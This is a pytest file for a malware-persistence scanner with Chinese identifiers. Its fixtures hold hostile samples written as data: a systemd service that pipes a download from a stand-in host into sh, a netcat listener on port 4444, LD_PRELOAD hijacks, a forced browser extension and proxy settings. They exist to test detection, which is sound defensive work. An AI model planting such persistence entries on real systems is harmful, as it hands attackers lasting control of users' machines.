"""持久化规则与持久化位置清单。"""
from __future__ import annotations

from pathlib import Path

from servers.file_reviewer import scanner as sc


def _hits(tmp_path: Path, name: str, text: str) -> set[str]:
    f = tmp_path / name
    f.parent.mkdir(parents=True, exist_ok=True)
    f.write_text(text, encoding="utf-8")
    return {x.规则ID for x in sc.scan_file(f, sc.load_rules(), tmp_path)}


def test_ld_preload_rule(tmp_path: Path):
    assert "IN012" in _hits(tmp_path, "etc/ld.so.preload", "/usr/lib/libx.so\n")
    assert "IN012" in _hits(tmp_path, "x.sh", "export LD_PRELOAD=/tmp/evil.so\n")
    assert "IN012" in _hits(tmp_path, "y.sh", "DYLD_INSERT_LIBRARIES=/tmp/evil.dylib open -a Safari\n")


def test_browser_policy_and_hijack_rules(tmp_path: Path):
    pol = _hits(tmp_path, "etc/opt/chrome/policies/managed/x.json",
                '{"ExtensionInstallForcelist":["abcdefghijklmnop;https://x.example/update.xml"],"HomepageLocation":"https://evil.example"}\n')
    assert {"IN013", "IN014"} <= pol
    ff = _hits(tmp_path, "profile/user.js", 'lockPref("browser.startup.homepage", "https://evil.example");\nuser_pref("network.proxy.type", 1);\n')
    assert {"IN013", "IN014"} <= ff
    reg = _hits(tmp_path, "h.reg", r'[HKEY_LOCAL_MACHINE\Software\Policies\Google\Chrome]' + "\n" + r'"ProxyServer"="1.2.3.4:8080"' + "\n")
    assert {"IN013", "IN014"} <= reg
    assert "IN014" in _hits(tmp_path, "p.ps1", "netsh winhttp set proxy 10.0.0.9:3128\n")


def test_timer_restart_port_rules(tmp_path: Path):
    unit = _hits(tmp_path, "etc/systemd/system/x.service",
                 "[Service]\nExecStart=/usr/bin/nc -l 4444\nRestart=always\n[Install]\nWantedBy=multi-user.target\n")
    assert "IN015" in unit
    timer = _hits(tmp_path, "etc/systemd/system/x.timer", "[Timer]\nOnCalendar=*:0/5\n")
    assert "IN015" in timer
    sock = _hits(tmp_path, "etc/systemd/system/x.socket", "[Socket]\nListenStream=0.0.0.0:9000\n")
    assert "IN015" in sock
    plist = _hits(tmp_path, "Library/LaunchAgents/com.x.plist", "<dict><key>RunAtLoad</key><true/><key>KeepAlive</key><true/></dict>\n")
    assert "IN015" in plist
    fw = _hits(tmp_path, "fw.sh", "iptables -A INPUT -p tcp --dport 4444 -j ACCEPT\nufw allow 4444\n")
    assert "IN015" in fw


def test_persistence_inventory_lists_existing_and_scans(isolated_dirs, tmp_path: Path, monkeypatch):
    s = isolated_dirs["server"]
    home = tmp_path / "home"
    (home / ".config" / "systemd" / "user").mkdir(parents=True)
    (home / ".config" / "systemd" / "user" / "evil.service").write_text(
        "[Service]\nExecStart=/bin/bash -c 'curl https://evil.example.net/p | sh'\nRestart=always\n", encoding="utf-8")
    (home / ".bashrc").write_text("export LD_PRELOAD=/tmp/x.so\n", encoding="utf-8")
    (home / ".ssh").mkdir()
    (home / ".ssh" / "authorized_keys").write_text("ssh-ed25519 AAAA... someone\n", encoding="utf-8")
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("USERPROFILE", str(home))

    r = s.review_persistence_inventory()
    paths = {l["路径"]: l for l in r["存在的持久化位置"]}
    assert str(home / ".config" / "systemd" / "user") in paths
    assert paths[str(home / ".config" / "systemd" / "user")]["文件数"] == 1
    assert str(home / ".bashrc") in paths and str(home / ".ssh" / "authorized_keys") in paths
    ids = {f["规则ID"] for f in r["发现"]}
    assert {"IN012", "IN015"} <= ids, ids
    assert any("evil.service" in f["文件详细路径"] for f in r["发现"])
    assert "不会去跑命令" in r["诚实边界"]
    assert "systemctl list-timers" in " ".join(r["官方查看命令(你自己跑)"]["Linux"])
    guide = r["凭据轮换根治法(售出机器/读不到的VPS用)"]
    assert "不要试图远程连回已售出的机器" in guide["不要做的"]
    text = Path(r["报告"]["报告路径"]).read_text(encoding="utf-8")
    assert "## 持久化位置清单" in text and "凭据轮换根治法" in text
    # 没有 review_open 也能跑：落到独立报告
    assert Path(r["报告"]["报告路径"]).name.endswith("持久化位置.md")
